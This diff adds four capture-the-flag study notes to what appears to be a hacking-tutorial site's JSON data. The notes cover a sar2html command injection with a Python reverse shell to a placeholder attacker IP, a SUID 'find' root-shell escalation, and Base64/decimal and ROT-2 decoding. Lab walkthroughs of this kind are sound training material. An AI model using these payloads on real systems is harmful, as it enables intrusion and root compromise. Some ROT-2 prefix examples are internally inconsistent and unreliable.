@@ -9994,5 +9994,324 @@
         ]
       }
     ]
+  },
+  {
+    "id": 42,
+    "slug": "sar2",
+    "title": "Sar2",
+    "isLab": false,
+    "category": "notes",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocksFile": "./blocks/Others/sar2.json",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "sar2html-rce-intro",
+        "text": "Phase 1: Exploiting sar2html (Remote Code Execution)"
+      },
+      {
+        "type": "order_block",
+        "id": "rce-logic",
+        "text": "The discovery of <highlight>sar2html</highlight> in a hidden directory is the primary entry point. This application is vulnerable to <highlight>Remote Code Execution (RCE)</highlight> via the 'plot' parameter. By appending a semicolon followed by a system command to the URL, we can force the server to execute arbitrary bash commands as the <highlight>www-data</highlight> user."
+      },
+      {
+        "type": "section_heading",
+        "id": "rce-verification",
+        "text": "Step 1: Verifying the Vulnerability (PoC)"
+      },
+      {
+        "type": "order_block",
+        "id": "poc-logic",
+        "text": "We test for RCE by injecting a simple <highlight>id</highlight> or <highlight>pwd</highlight> command into the URL. If the server is vulnerable, the command output will appear within the 'Select Plot' dropdown menu or the page source."
+      },
+      {
+        "type": "code_block",
+        "id": "browser-poc",
+        "language": "text",
+        "code": "# URL-based Command Injection\nhttp://10.114.161.147/joomla/_test/index.php?plot=;id"
+      },
+      {
+        "type": "output_block",
+        "id": "rce-output",
+        "language": "text",
+        "code": "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
+      },
+      {
+        "type": "section_heading",
+        "id": "reverse-shell-delivery",
+        "text": "Step 2: Gaining a Reverse Shell"
+      },
+      {
+        "type": "order_block",
+        "id": "rev-shell-logic",
+        "text": "Once RCE is confirmed, we use a <highlight>Python3</highlight> one-liner to establish a reverse connection back to our Kali machine. This provides a more stable interactive environment than the URL bar."
+      },
+      {
+        "type": "code_block",
+        "id": "kali-listener",
+        "language": "bash",
+        "code": "# On Kali (Azid@Azid)\nnc -lvnp 4444"
+      },
+      {
+        "type": "code_block",
+        "id": "payload-injection",
+        "language": "text",
+        "code": "# Injecting the Python3 Reverse Shell (URL Encoded)\nindex.php?plot=;python3%20-c%20'import%20socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<KALI_IP>\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
+      },
+      {
+        "type": "section_heading",
+        "id": "shell-stabilization",
+        "text": "Step 3: Upgrading to a TTY Shell"
+      },
+      {
+        "type": "order_block",
+        "id": "tty-logic",
+        "text": "A standard netcat shell is 'dumb' (no tab-completion or arrow keys). We upgrade it to a full <highlight>TTY</highlight> shell using Python and terminal state manipulation."
+      },
+      {
+        "type": "code_block",
+        "id": "tty-upgrade",
+        "language": "bash",
+        "code": "# Inside the netcat shell\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n# Press Ctrl+Z to background, then:\nstty raw -echo; fg\n\n# Inside the shell again:\nexport TERM=xterm"
+      },
+      {
+        "type": "explanation",
+        "id": "sar2-summary",
+        "title": "sar2html RCE Summary",
+        "items": [
+          "Vulnerability: Unsanitized input in the 'plot' GET parameter",
+          "Impact: Remote Code Execution (RCE) as the web user (www-data)",
+          "Stability: Upgrade to TTY is required for complex enumeration",
+          "Next Step: Begin local file system enumeration for lateral movement"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 43,
+    "slug": "find",
+    "title": "Find",
+    "isLab": false,
+    "category": "notes",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocksFile": "./blocks/PrivEsc-Exploits/find/find.json",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "suid-priv-esc-intro",
+        "text": "Phase 1: Privilege Escalation via SUID (find)"
+      },
+      {
+        "type": "order_block",
+        "id": "suid-logic",
+        "text": "The discovery of a misconfigured <highlight>SUID</highlight> bit on a system binary is a high-impact privilege escalation vector. By running a search for binaries with the <highlight>4000</highlight> permission bit, we can identify binaries like <highlight>/usr/bin/find</highlight> that allow us to execute commands with root privileges directly from a low-privileged user account."
+      },
+      {
+        "type": "section_heading",
+        "id": "suid-discovery",
+        "text": "Step 1: Identifying Vulnerable Binaries"
+      },
+      {
+        "type": "order_block",
+        "id": "find-perm-logic",
+        "text": "We use the <highlight>find</highlight> command to scan the file system for any file with the SUID bit set. This search specifically looks for files where the owner is root but any user can execute the file with the owner's permissions."
+      },
+      {
+        "type": "code_block",
+        "id": "find-suid-command",
+        "language": "bash",
+        "code": "# Search for SUID binaries\nfind / -perm -4000 2>/dev/null"
+      },
+      {
+        "type": "output_block",
+        "id": "suid-output",
+        "language": "text",
+        "code": "/usr/bin/sudo\n/usr/bin/find\n/usr/bin/at\n/usr/bin/passwd"
+      },
+      {
+        "type": "section_heading",
+        "id": "suid-exploitation",
+        "text": "Step 2: Executing the find Escape"
+      },
+      {
+        "type": "order_block",
+        "id": "exec-p-logic",
+        "text": "The <highlight>-exec</highlight> flag in <highlight>find</highlight> runs a command on every file found. By pointing it at a single dot (current directory) and telling it to run <highlight>/bin/sh -p</highlight>, we force the SUID binary to spawn a privileged shell."
+      },
+      {
+        "type": "code_block",
+        "id": "root-shell-exec",
+        "language": "bash",
+        "code": "# Spawn a privileged root shell\n/usr/bin/find . -exec /bin/sh -p \\; -quit"
+      },
+      {
+        "type": "section_heading",
+        "id": "root-verification",
+        "text": "Step 3: Verification and Flag Capture"
+      },
+      {
+        "type": "order_block",
+        "id": "final-check-logic",
+        "text": "Success is confirmed when <highlight>whoami</highlight> returns root. From here, we can access the root home directory to capture the final flag."
+      },
+      {
+        "type": "code_block",
+        "id": "whoami-check",
+        "language": "bash",
+        "code": "# Check current user and grab flag\nwhoami\ncd /root\nls -la\ncat .secret"
+      },
+      {
+        "type": "explanation",
+        "id": "suid-find-summary",
+        "title": "Exploit Takeaways",
+        "items": [
+          "Vulnerability: Incorrect file permissions (SUID bit on functional binaries)",
+          "Discovery: Always check SUID bits during post-exploitation enumeration",
+          "Technique: Use the binary's native functionality (-exec) to escape restricted environments",
+          "Defense: Never set the SUID bit on binaries that allow shell access or command execution"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 44,
+    "slug": "triple-layer",
+    "title": "Triple Layer",
+    "isLab": false,
+    "category": "notes",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocksFile": "./blocks/Decoding/triple-layer.json",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "triple-layer-decoding",
+        "text": "Phase 0: Triple-Layered Obfuscation (Decimal > Base64 > Plaintext)"
+      },
+      {
+        "type": "order_block",
+        "id": "triple-layer-logic",
+        "text": "We encountered a string of <highlight>Decimal ASCII codes</highlight>. This requires a three-step extraction process: converting decimals to characters, decoding the resulting <highlight>Base64</highlight> string, and finally reading the hidden plaintext message."
+      },
+      {
+        "type": "section_heading",
+        "id": "decimal-conversion",
+        "text": "Step 1: Decimal to ASCII Conversion"
+      },
+      {
+        "type": "order_block",
+        "id": "awk-logic",
+        "text": "The input consists of space-separated decimal values. Using <highlight>awk</highlight> with the <highlight>printf \"%c\"</highlight> function, we iterate through each field to convert the numbers into their corresponding ASCII characters."
+      },
+      {
+        "type": "code_block",
+        "id": "decimal-to-char",
+        "language": "bash",
+        "code": "# Converting Decimal to a Base64 String\necho \"079 084 10...\" | awk '{for(i=1;i<=NF;i++) printf \"%c\", $i}'"
+      },
+      {
+        "type": "section_heading",
+        "id": "base64-final-decode",
+        "text": "Step 2: Decoding the Intermediate Base64"
+      },
+      {
+        "type": "order_block",
+        "id": "chain-logic",
+        "text": "The output from Step 1 is a Base64 string. We pipe this directly into <highlight>base64 -d</highlight> to reveal the final hidden message."
+      },
+      {
+        "type": "code_block",
+        "id": "full-chain-command",
+        "language": "bash",
+        "code": "# The complete decoding pipeline\necho \"079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075\" | awk '{for(i=1;i<=NF;i++) printf \"%c\", $i}' | base64 -d"
+      },
+      {
+        "type": "explanation",
+        "id": "decoding-takeaways",
+        "title": "Analysis of the Technique",
+        "items": [
+          "Decimal Identification: Numbers in the 032-126 range usually represent printable ASCII.",
+          "Pipeline Efficiency: Using pipes (|) allows for rapid testing of different decoding layers.",
+          "Automation: In a real scenario, CyberChef's 'Magic' tool can often automate this entire sequence."
+        ]
+      }
+    ]
+  },
+  {
+    "id": 45,
+    "slug": "rot2",
+    "title": "Rot-2",
+    "isLab": false,
+    "category": "notes",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocksFile": "./blocks/Decoding/rot2.json",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "rot2-id-guide",
+        "text": "Special Technique: Identifying and Breaking ROT-2 Obfuscation"
+      },
+      {
+        "type": "order_block",
+        "id": "identification-logic",
+        "text": "Cybersecurity mein jab koi string <highlight>Base64</highlight> jaisi dikhay par decode na ho, toh aksar us par <highlight>Caesar Cipher (ROT)</highlight> apply kiya gaya hota hai. ROT-2 ka matlab hai ke alphabet ko 2 positions aagay shift kiya gaya hai (A banta hai C, B banta hai D)."
+      },
+      {
+        "type": "section_heading",
+        "id": "pattern-recognition",
+        "text": "Step 1: How to Spot ROT-2 (Pattern Matching)"
+      },
+      {
+        "type": "order_block",
+        "id": "prefix-analysis",
+        "text": "Standard Base64 prefixes ko target string se compare karein. Agar difference hamesha <highlight>2 letters</highlight> ka hai, toh yeh confirm ROT-2 hai."
+      },
+      {
+        "type": "explanation",
+        "id": "prefix-table",
+        "title": "Common ROT-2 Detection Patterns",
+        "items": [
+          "Target: 'VjJ' ---> Standard: 'V2h' (Word: 'Who') [j - h = 2]",
+          "Target: 'SVRv' ---> Standard: 'QWRt' (Word: 'Admin') [S - Q = 2]",
+          "Target: 'jTVV' ---> Standard: 'aHR0' (Word: 'http') [j - h = 2]"
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "deciphering-method",
+        "text": "Step 2: Reversing the Shift using 'tr'"
+      },
+      {
+        "type": "order_block",
+        "id": "tr-command-logic",
+        "text": "Alphabet ko 2 positions peeche lane ke liye hum <highlight>tr</highlight> (translate) utility use karte hain. Hum system ko batate hain ke 'c' se start hone wali series ko 'a' se map karein."
+      },
+      {
+        "type": "code_block",
+        "id": "rot2-decoder-cmd",
+        "language": "bash",
+        "code": "# Generic ROT-2 Decoder (Shift -2)\necho \"[TARGET_STRING]\" | tr 'c-za-bC-ZA-B' 'a-zA-Z'"
+      },
+      {
+        "type": "section_heading",
+        "id": "full-chain-example",
+        "text": "Step 3: Real-World Example (Boiler-CTF)"
+      },
+      {
+        "type": "code_block",
+        "id": "boiler-full-decode",
+        "language": "bash",
+        "code": "# Full Chain: ROT-2 Translate then Base64 Decode\necho \"VjJodmNITnBaU0JrWVdsemVRbz0K\" | tr 'c-za-bC-ZA-B' 'a-zA-Z' | base64 -d\n\n# Result: Whoopsie daisy"
+      },
+      {
+        "type": "explanation",
+        "id": "summary-tips",
+        "title": "Pro-Tips for Future Challenges",
+        "items": [
+          "Padding Check: Agar end mein '=' hai toh hamesha Base64 check karein.",
+          "Manual Shift: Agar standard tools fail hon, toh pehle 3 letters ka manual alphabet count check karein.",
+          "Automation: CyberChef mein 'ROT13' recipe use karke 'Amount' ko 2 set karne se bhi yeh solve ho jata hai."
+        ]
+      }
+    ]
   }
 ]
